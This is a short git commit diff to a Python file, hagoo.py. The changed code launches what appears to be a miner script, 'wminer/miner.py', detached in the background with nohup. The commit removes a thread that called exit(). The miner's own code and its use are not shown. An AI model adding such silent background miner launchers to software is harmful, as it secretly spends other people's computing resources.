f5568121f4bce9c31be26db1f41293571d553e8a
Vyom 907 AND Vyom Wankhede <111875466+VYOM00907@users.noreply.github.com>
2023-06-04 08:31:17 +0000

    update

--- hagoo.py
+++ hagoo.py
@@ -8,13 +8,9 @@ from sys import exit
 def lonc():
     subprocess.run(["bash","-c","nohup python wminer/miner.py &"])
 
-def oo():
-    
-    exit()
+
     
 t1 = Process(target=lonc, args=())
-t2 = threading.Thread(target=oo, args=())
-t2.start()
 t1.start()
     
     
